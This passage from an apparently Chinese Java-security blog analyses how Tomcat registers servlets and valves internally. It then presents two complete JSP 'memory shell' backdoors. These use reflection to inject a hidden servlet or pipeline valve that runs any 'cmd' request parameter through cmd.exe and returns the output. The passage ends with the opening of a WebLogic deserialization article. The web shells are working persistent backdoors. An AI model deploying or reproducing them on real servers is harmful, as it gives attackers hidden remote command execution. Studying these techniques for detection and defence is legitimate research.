<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">doGet:<span class="number">15</span>, HelloServlet (org.example.servlet)</span><br><span class="line">service:<span class="number">502</span>, HttpServlet (javax.servlet.http)</span><br><span class="line">service:<span class="number">596</span>, HttpServlet (javax.servlet.http)</span><br><span class="line">internalDoFilter:<span class="number">209</span>, ApplicationFilterChain (org.apache.catalina.core)</span><br><span class="line">doFilter:<span class="number">153</span>, ApplicationFilterChain (org.apache.catalina.core)</span><br><span class="line">doFilter:<span class="number">53</span>, WsFilter (org.apache.tomcat.websocket.server)</span><br><span class="line">internalDoFilter:<span class="number">178</span>, ApplicationFilterChain (org.apache.catalina.core)</span><br><span class="line">doFilter:<span class="number">153</span>, ApplicationFilterChain (org.apache.catalina.core)</span><br><span class="line">doFilter:<span class="number">17</span>, HelloFilter (org.example.filter)</span><br><span class="line">internalDoFilter:<span class="number">178</span>, ApplicationFilterChain (org.apache.catalina.core)</span><br><span class="line">doFilter:<span class="number">153</span>, ApplicationFilterChain (org.apache.catalina.core)</span><br><span class="line">invoke:<span class="number">167</span>, StandardWrapperValve (org.apache.catalina.core)</span><br><span class="line">invoke:<span class="number">90</span>, StandardContextValve (org.apache.catalina.core)</span><br><span class="line">invoke:<span class="number">492</span>, AuthenticatorBase (org.apache.catalina.authenticator)</span><br><span class="line">invoke:<span class="number">130</span>, StandardHostValve (org.apache.catalina.core)</span><br><span class="line">invoke:<span class="number">93</span>, ErrorReportValve (org.apache.catalina.valves)</span><br><span class="line">invoke:<span class="number">673</span>, AbstractAccessLogValve (org.apache.catalina.valves)</span><br><span class="line">invoke:<span class="number">74</span>, StandardEngineValve (org.apache.catalina.core)</span><br><span class="line">service:<span class="number">343</span>, CoyoteAdapter (org.apache.catalina.connector)</span><br><span class="line">service:<span class="number">389</span>, Http11Processor (org.apache.coyote.http11)</span><br><span class="line">process:<span class="number">63</span>, AbstractProcessorLight (org.apache.coyote)</span><br><span class="line">process:<span class="number">926</span>, AbstractProtocol$ConnectionHandler (org.apache.coyote)</span><br><span class="line">doRun:<span class="number">1791</span>, NioEndpoint$SocketProcessor (org.apache.tomcat.util.net)</span><br><span class="line">run:<span class="number">49</span>, SocketProcessorBase (org.apache.tomcat.util.net)</span><br><span class="line">runWorker:<span class="number">1191</span>, ThreadPoolExecutor (org.apache.tomcat.util.threads)</span><br><span class="line">run:<span class="number">659</span>, ThreadPoolExecutor$Worker (org.apache.tomcat.util.threads)</span><br><span class="line">run:<span class="number">61</span>, TaskThread$WrappingRunnable (org.apache.tomcat.util.threads)</span><br><span class="line">run:<span class="number">745</span>, Thread (java.lang)</span><br></pre></td></tr></table></figure>

<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>在StandardContext中，与servlet相关的有这两个属性：<br>children：<br><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230919164434.png"><br>servletMappings:<br><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230919164547.png"></p>
<p>查看实现类ApplicationContext中的addServlet方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> ServletRegistration.Dynamic <span class="title function_">addServlet</span><span class="params">(String servletName, String servletClass, Servlet servlet,</span></span><br><span class="line"><span class="params">        Map&lt;String, String&gt; initParams)</span> <span class="keyword">throws</span> IllegalStateException &#123;</span><br><span class="line">    <span class="comment">// servlet不能为空</span></span><br><span class="line">    <span class="keyword">if</span> (servletName == <span class="literal">null</span> || servletName.equals(<span class="string">&quot;&quot;</span>)) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(sm.getString(<span class="string">&quot;applicationContext.invalidServletName&quot;</span>, servletName));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// TODO Spec breaking enhancement to ignore this restriction</span></span><br><span class="line">    checkState(<span class="string">&quot;applicationContext.addServlet.ise&quot;</span>);</span><br><span class="line">    <span class="comment">// 根据name在context的children中获取对应的Wrapper</span></span><br><span class="line">    <span class="type">Wrapper</span> <span class="variable">wrapper</span> <span class="operator">=</span> (Wrapper) context.findChild(servletName);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Assume a &#x27;complete&#x27; ServletRegistration is one that has a class and</span></span><br><span class="line">    <span class="comment">// a name</span></span><br><span class="line">    <span class="comment">// 如果不存在对应的Wrapper，就创建一个</span></span><br><span class="line">    <span class="keyword">if</span> (wrapper == <span class="literal">null</span>) &#123;</span><br><span class="line">        wrapper = context.createWrapper();</span><br><span class="line">        wrapper.setName(servletName);</span><br><span class="line">        context.addChild(wrapper);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (wrapper.getName() != <span class="literal">null</span> &amp;&amp; wrapper.getServletClass() != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (wrapper.isOverridable()) &#123;</span><br><span class="line">                wrapper.setOverridable(<span class="literal">false</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">ServletSecurity</span> <span class="variable">annotation</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">if</span> (servlet == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="comment">// 设置servletClass</span></span><br><span class="line">        wrapper.setServletClass(servletClass);</span><br><span class="line">        Class&lt;?&gt; clazz = Introspection.loadClass(context, servletClass);</span><br><span class="line">        <span class="keyword">if</span> (clazz != <span class="literal">null</span>) &#123;</span><br><span class="line">            annotation = clazz.getAnnotation(ServletSecurity.class);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 设置servletClass</span></span><br><span class="line">        wrapper.setServletClass(servlet.getClass().getName());</span><br><span class="line">        wrapper.setServlet(servlet);</span><br><span class="line">        <span class="keyword">if</span> (context.wasCreatedDynamicServlet(servlet)) &#123;</span><br><span class="line">            annotation = servlet.getClass().getAnnotation(ServletSecurity.class);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (initParams != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">for</span> (Map.Entry&lt;String, String&gt; initParam : initParams.entrySet()) &#123;</span><br><span class="line">            wrapper.addInitParameter(initParam.getKey(), initParam.getValue());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//创建AoolicationServletRegistration对象并返回</span></span><br><span class="line">    ServletRegistration.<span class="type">Dynamic</span> <span class="variable">registration</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ApplicationServletRegistration</span>(wrapper, context);</span><br><span class="line">    <span class="keyword">if</span> (annotation != <span class="literal">null</span>) &#123;</span><br><span class="line">        registration.setServletSecurity(<span class="keyword">new</span> <span class="title class_">ServletSecurityElement</span>(annotation));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> registration;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后在ApplicationServletRegistration的addMapping中</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> Set&lt;String&gt; <span class="title function_">addMapping</span><span class="params">(String... urlPatterns)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (urlPatterns == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> Collections.emptySet();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Set&lt;String&gt; conflicts = <span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;&gt;();</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (String urlPattern : urlPatterns) &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">wrapperName</span> <span class="operator">=</span> context.findServletMapping(urlPattern);</span><br><span class="line">        <span class="keyword">if</span> (wrapperName != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="type">Wrapper</span> <span class="variable">wrapper</span> <span class="operator">=</span> (Wrapper) context.findChild(wrapperName);</span><br><span class="line">            <span class="keyword">if</span> (wrapper.isOverridable()) &#123;</span><br><span class="line">                <span class="comment">// Some Wrappers (from global and host web.xml) may be</span></span><br><span class="line">                <span class="comment">// overridden rather than generating a conflict</span></span><br><span class="line">                context.removeServletMapping(urlPattern);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                conflicts.add(urlPattern);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!conflicts.isEmpty()) &#123;</span><br><span class="line">        <span class="keyword">return</span> conflicts;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 向context中添加URL和对应的wrapper</span></span><br><span class="line">    <span class="keyword">for</span> (String urlPattern : urlPatterns) &#123;</span><br><span class="line">        context.addServletMappingDecoded(UDecoder.URLDecode(urlPattern, StandardCharsets.UTF_8), wrapper.getName());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (constraint != <span class="literal">null</span>) &#123;</span><br><span class="line">        context.addServletSecurity(<span class="built_in">this</span>, constraint);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> Collections.emptySet();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这个方法调用了StandardContext的addServletMappingDecoded方法，添加URL路径与Wrapper对象的映射</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addServletMappingDecoded</span><span class="params">(String pattern, String name, <span class="type">boolean</span> jspWildCard)</span> &#123;</span><br><span class="line">    <span class="comment">// Validate the proposed mapping</span></span><br><span class="line">    <span class="keyword">if</span> (findChild(name) == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(sm.getString(<span class="string">&quot;standardContext.servletMap.name&quot;</span>, name));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">String</span> <span class="variable">adjustedPattern</span> <span class="operator">=</span> adjustURLPattern(pattern);</span><br><span class="line">    <span class="keyword">if</span> (!validateURLPattern(adjustedPattern)) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(sm.getString(<span class="string">&quot;standardContext.servletMap.pattern&quot;</span>, adjustedPattern));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Add this mapping to our registered set</span></span><br><span class="line">    <span class="keyword">synchronized</span> (servletMappingsLock) &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">name2</span> <span class="operator">=</span> servletMappings.get(adjustedPattern);</span><br><span class="line">        <span class="keyword">if</span> (name2 != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="comment">// Don&#x27;t allow more than one servlet on the same pattern</span></span><br><span class="line">            <span class="type">Wrapper</span> <span class="variable">wrapper</span> <span class="operator">=</span> (Wrapper) findChild(name2);</span><br><span class="line">            wrapper.removeMapping(adjustedPattern);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 这里</span></span><br><span class="line">        servletMappings.put(adjustedPattern, name);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">Wrapper</span> <span class="variable">wrapper</span> <span class="operator">=</span> (Wrapper) findChild(name);</span><br><span class="line">    wrapper.addMapping(adjustedPattern);</span><br><span class="line"></span><br><span class="line">    fireContainerEvent(<span class="string">&quot;addServletMapping&quot;</span>, adjustedPattern);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>通过这个方法在servletMappings中添加URL路径与name的映射</p>
<h2 id="Servlet内存马"><a href="#Servlet内存马" class="headerlink" title="Servlet内存马"></a>Servlet内存马</h2><p>servletMemshell.jsp:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;%--</span><br><span class="line">  Created by IntelliJ IDEA.</span><br><span class="line">  User: DiliLearngent</span><br><span class="line">  Date: <span class="number">2023</span>/<span class="number">9</span>/<span class="number">19</span></span><br><span class="line">  Time: <span class="number">18</span>:<span class="number">43</span></span><br><span class="line">  To change <span class="built_in">this</span> template use File | Settings | File Templates.</span><br><span class="line">--%&gt;</span><br><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.IOException&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.InputStream&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.Scanner&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Field&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.ApplicationContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.Wrapper&quot;</span> %&gt;</span><br><span class="line">&lt;% <span class="keyword">class</span> <span class="title class_">MyServlet</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        <span class="keyword">if</span>(req.getParameter(<span class="string">&quot;cmd&quot;</span>) != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                in = Runtime.getRuntime().exec(<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/C&quot;</span>, req.getParameter(<span class="string">&quot;cmd&quot;</span>)&#125;).getInputStream();</span><br><span class="line">                <span class="type">Scanner</span> <span class="variable">scanner</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(in).useDelimiter(<span class="string">&quot;\\A&quot;</span>);</span><br><span class="line">                <span class="type">String</span> <span class="variable">out</span> <span class="operator">=</span> scanner.hasNext()?scanner.next():<span class="string">&quot;&quot;</span>;</span><br><span class="line">                resp.getWriter().write(out);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e) &#123;&#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.destroy();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">%&gt;</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">myServletname</span> <span class="operator">=</span> <span class="string">&quot;myServletShell&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 获取应用程序上下文对象(ApplicationContextFacade)</span></span><br><span class="line">        <span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span> request.getSession().getServletContext();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(servletContext.getServletRegistration(myServletname) == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="comment">// 获取ApplicationContext</span></span><br><span class="line">            <span class="type">Field</span> <span class="variable">applicationContextField</span> <span class="operator">=</span> servletContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">            applicationContextField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="type">ApplicationContext</span> <span class="variable">applicationContext</span> <span class="operator">=</span> (ApplicationContext) applicationContextField.get(servletContext);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 获取StandardContext</span></span><br><span class="line">            <span class="type">Field</span> <span class="variable">standardConextField</span> <span class="operator">=</span> applicationContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">            standardConextField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) standardConextField.get(applicationContext);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 创建自定义的servlet</span></span><br><span class="line">            <span class="type">MyServlet</span> <span class="variable">myServlet</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MyServlet</span>();</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 使用Wrapper封装Servlet</span></span><br><span class="line">            <span class="type">Wrapper</span> <span class="variable">wrapper</span> <span class="operator">=</span> standardContext.createWrapper();</span><br><span class="line">            wrapper.setName(myServletname);</span><br><span class="line">            wrapper.setServletClass(myServlet.getClass().getName());</span><br><span class="line">            wrapper.setServlet(myServlet);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 向standardContext中的child添加wrapper</span></span><br><span class="line">            standardContext.addChild(wrapper);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 向servletMappings中添加</span></span><br><span class="line">            standardContext.addServletMappingDecoded(<span class="string">&quot;/myservlet&quot;</span>, myServletname);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>

<h2 id="参考-2"><a href="#参考-2" class="headerlink" title="参考"></a>参考</h2><p><a href="https://su18.org/post/memory-shell/#servlet-%E5%86%85%E5%AD%98%E9%A9%AC">JavaWeb 内存马一周目通关攻略</a><br><a href="https://p1n93r.github.io/post/security/tomcat%E4%B9%8Bservlet%E5%86%85%E5%AD%98%E9%A9%AC/">Tomcat之Servlet内存马</a><br><a href="https://cangqingzhe.github.io/2020/12/31/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90-servlet%E5%86%85%E5%AD%98%E9%A9%AC/">Tomcat内存马实现原理解析-servlet内存马</a></p>
<h1 id="Valve"><a href="#Valve" class="headerlink" title="Valve"></a>Valve</h1><h2 id="简介-2"><a href="#简介-2" class="headerlink" title="简介"></a>简介</h2><p>Tomcat中定义了两个接口，分别是Pipeline（管道）和Valve（阀）<br><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230922161115.png"><br>如上图所示，Tomcat每个层级的容器（）都维持一个管道（Pipeline示例），在ContainerBase中实例化了一个PipeLine对象，而如StandardContext这些类继承ContainerBase类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">final</span> <span class="type">Pipeline</span> <span class="variable">pipeline</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StandardPipeline</span>(<span class="built_in">this</span>);</span><br></pre></td></tr></table></figure>

<p>而且在每个层级的容器中，都有基础的Valve，如StandardHostValve、StandardEngineValve、StandardContextValve、StandardWrapperValve，都继承了ValveBase基础类，<strong>它们位于各容器管道的最后一个位置</strong>（即图中的basic位置），并且在invoke方法中，都存在获取下一个管道并且调用下一个管道第一个阀门的代码</p>
<p>ValveBase类继承了Valve接口，这个类实现了生命接口及MBean接口</p>
<p>Pipeline接口：<br><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230922211805.png"><br>Valve接口：<br><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230922212048.png"></p>
<h2 id="例子-3"><a href="#例子-3" class="headerlink" title="例子"></a>例子</h2><p>HelloValve类：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example.valve;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.connector.Request;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.connector.Response;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.valves.ValveBase;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletException;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloValve</span> <span class="keyword">extends</span> <span class="title class_">ValveBase</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">invoke</span><span class="params">(Request request, Response response)</span> <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;yes&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Tomcat中的server.xml配置：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">Valve</span> <span class="attr">className</span>=<span class="string">&quot;org.example.valve.HelloValve&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="Valve内存马"><a href="#Valve内存马" class="headerlink" title="Valve内存马"></a>Valve内存马</h2><p>valveMemshell.jsp:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;%--</span><br><span class="line">  Created by IntelliJ IDEA.</span><br><span class="line">  User: DiliLearngent</span><br><span class="line">  Date: <span class="number">2023</span>/<span class="number">9</span>/<span class="number">22</span></span><br><span class="line">  Time: <span class="number">23</span>:<span class="number">12</span></span><br><span class="line">  To change <span class="built_in">this</span> template use File | Settings | File Templates.</span><br><span class="line">--%&gt;</span><br><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.valves.ValveBase&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.connector.Request&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.connector.Response&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.IOException&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.Scanner&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.InputStream&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Field&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.ApplicationContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;</span><br><span class="line"></span><br><span class="line">&lt;%!</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ValveShell</span> <span class="keyword">extends</span> <span class="title class_">ValveBase</span> &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">invoke</span><span class="params">(Request request, Response response)</span> <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">            <span class="keyword">if</span>(request.getParameter(<span class="string">&quot;cmd&quot;</span>) != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    in = Runtime.getRuntime().exec(<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/C&quot;</span>, request.getParameter(<span class="string">&quot;cmd&quot;</span>)&#125;).getInputStream();</span><br><span class="line">                    <span class="type">Scanner</span> <span class="variable">scanner</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(in).useDelimiter(<span class="string">&quot;\\A&quot;</span>);</span><br><span class="line">                    <span class="type">String</span> <span class="variable">out</span> <span class="operator">=</span> scanner.hasNext()?scanner.next():<span class="string">&quot;&quot;</span>;</span><br><span class="line">                    response.getWriter().write(out);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (Exception e) &#123;&#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">    <span class="type">ServletContext</span> <span class="variable">serverContext</span> <span class="operator">=</span> request.getSession().getServletContext();</span><br><span class="line">    <span class="type">Field</span> <span class="variable">applicationContextField</span> <span class="operator">=</span> serverContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">    applicationContextField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">ApplicationContext</span> <span class="variable">applicationContext</span> <span class="operator">=</span> (ApplicationContext) applicationContextField.get(serverContext);</span><br><span class="line"></span><br><span class="line">    <span class="type">Field</span> <span class="variable">standardContextField</span> <span class="operator">=</span> applicationContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">    standardContextField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) standardContextField.get(applicationContext);</span><br><span class="line"></span><br><span class="line">    <span class="type">ValveShell</span> <span class="variable">myValveShell</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ValveShell</span>();</span><br><span class="line">    standardContext.getPipeline().addValve(myValveShell);</span><br><span class="line"></span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>

<h2 id="参考-3"><a href="#参考-3" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.freebuf.com/articles/web/348663.html">擅长捉弄的内存马同学：Valve内存马</a><br><a href="https://aluvion.github.io/2022/11/22/Java-Tomcat-Valve%E5%86%85%E5%AD%98%E9%A9%AC/">Java Tomcat Valve内存马</a><br><a href="https://myzxcg.com/2021/10/Tomcat-%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90%E5%8F%8A%E6%A3%80%E6%B5%8B/#valve">Tomcat 内存马分析及检测</a></p>
<blockquote>
<p>注：本文首发于<a href="https://xz.aliyun.com/t/13024">https://xz.aliyun.com/t/13024</a></p>
</blockquote>
]]></content>
      <categories>
        <category>Java安全</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>Java安全</tag>
      </tags>
  </entry>
  <entry>
    <title>Java安全之Weblogic漏洞分析与利用</title>
    <url>/2023/05/02/Weblogic-Security/</url>
    <content><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>官方介绍：Oracle WebLogic Server 是一个统一的可扩展平台，专用于开发、部署和运行 Java 应用等适用于本地环境和云环境的企业应用。它提供了一种强健、成熟和可扩展的 Java Enterprise Edition (EE) 和 Jakarta EE 实施方式。类似于Tomcat、Jboss等。<br><strong>安装</strong>：<br>Windows下的安装教程：<a href="https://www.cnblogs.com/xrg-blog/p/12779853.html">https://www.cnblogs.com/xrg-blog/p/12779853.html</a><br>Linux下的安装教程：<a href="https://www.cnblogs.com/vhua/p/weblogic_1.html">https://www.cnblogs.com/vhua/p/weblogic_1.html</a><br><strong>其他</strong>：</p>
<ul>
<li>weblogic登录界面默认端口是7001，可在<code>%weblogic%\user_projects\domains\base_domain\config\config.xml</code>中修改端口<br>参考：<a href="https://www.cnblogs.com/qlqwjy/p/9685924.html">https://www.cnblogs.com/qlqwjy/p/9685924.html</a></li>
</ul>
<h1 id="漏洞合集"><a href="#漏洞合集" class="headerlink" title="漏洞合集"></a>漏洞合集</h1><h1 id="反序列化漏洞"><a href="#反序列化漏洞" class="headerlink" title="反序列化漏洞"></a>反序列化漏洞</h1><p>在weblogic中反序列化漏洞主要分为两种，一种是基于T3协议的反序列化漏洞，还一种是基于XML的反序列化漏洞</p>
<h2 id="基于T3协议"><a href="#基于T3协议" class="headerlink" title="基于T3协议"></a>基于T3协议</h2><h3 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h3><p><strong>T3协议概述</strong>：在RMI通信过程中，正常传输反序列化的数据过程中，通信使用的是JRMP协议，但是在weblogic的RMI通信过程中使用的是T3协议<br><strong>特点</strong>：</p>
<ul>
<li>服务端可以持续追踪监控客户端是否存活，即为心跳机制</li>
<li>通过建立一次连接可以将全部数据包传输完成</li>
</ul>
